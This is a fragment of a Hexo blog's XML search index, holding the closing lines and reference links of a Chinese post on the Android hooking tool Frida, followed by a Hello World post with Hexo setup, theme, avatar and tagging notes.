<p>就个人而言，针对Frida和Xposed相比，Frida操作更简单，而且不需要重启手机。但相关资料较少，还是需要慢慢学习。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ol>
<li><a href="https://www.frida.re/docs/examples/android/" target="_blank" rel="noopener">https://www.frida.re/docs/examples/android/</a></li>
<li><a href="https://www.codemetrix.net/hacking-android-apps-with-frida-1/" target="_blank" rel="noopener">https://www.codemetrix.net/hacking-android-apps-with-frida-1/</a></li>
<li><a href="http://www.cnblogs.com/konf/p/5998785.html" target="_blank" rel="noopener">http://www.cnblogs.com/konf/p/5998785.html</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> Android技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 安卓Hook </tag>
            
            <tag> Frida </tag>
            
            <tag> 摇骰子 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>/2017/03/20/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.<br><a id="more"></a></p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-blog"><a href="#Create-a-new-blog" class="headerlink" title="Create a new blog"></a>Create a new blog</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init</span><br></pre></td></tr></table></figure>
<h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
<h3 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h3><p>运行<code>hexo server</code>，浏览器输入<a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a> 无法访问</p>
<p>产生原因可能是<strong>端口占用</strong>。</p>
<p>Windows下运行命令<code>netstat -ano | findstr 4000</code>，看是否有有进程占用了4000端口。</p>
<p><img src="/2017/03/20/hello-world/端口占用.png" alt="端口占用"><br>这是安装了福昕PDF阅读器的原因，将<code>Foxitprotect.exe</code>进程结束即可。</p>
<h3 id="安装主题"><a href="#安装主题" class="headerlink" title="安装主题"></a>安装主题</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/litten/hexo-theme-yilia.git themes/yilia</span><br></pre></td></tr></table></figure>
<p><img src="/2017/03/20/hello-world/获取主题.png" alt="获取主题"></p>
<p>修改hexo根目录下的 _config.yml ： <code>theme: yilia</code></p>
<p>之后运行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure></p>
<h3 id="修改头像"><a href="#修改头像" class="headerlink" title="修改头像"></a>修改头像</h3><p>hexo根目录下source文件夹中新建assets\img文件夹，将头像文件复制进去<br>修改<strong>主题目录</strong>中的_config.yml ：<code>avatar: /assets/img/avatar.jpg</code></p>
<p><img src="/2017/03/20/hello-world/修改头像.png" alt="修改头像"></p>
<h3 id="添加标签"><a href="#添加标签" class="headerlink" title="添加标签"></a>添加标签</h3><h5 id="1-添加标签"><a href="#1-添加标签" class="headerlink" title="1.添加标签"></a>1.添加标签</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tag: 标签</span><br></pre></td></tr></table></figure>
<h5 id="2-添加多个标签"><a href="#2-添加多个标签" class="headerlink" title="2.添加多个标签"></a>2.添加多个标签</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tags: [标签1,标签2,标签3]</span><br></pre></td></tr></table></figure>
<p>或者：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tags:</span><br><span class="line">     - 标签1</span><br><span class="line">     - 标签2</span><br></pre></td></tr></table></figure></p>
<h3 id="文章部分显示"><a href="#文章部分显示" class="headerlink" title="文章部分显示"></a>文章部分显示</h3><p>使用<code>&lt;!-- more --&gt;</code>标签来隐藏其下面的内容~</p>
]]></content>
      
        
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 主题 </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
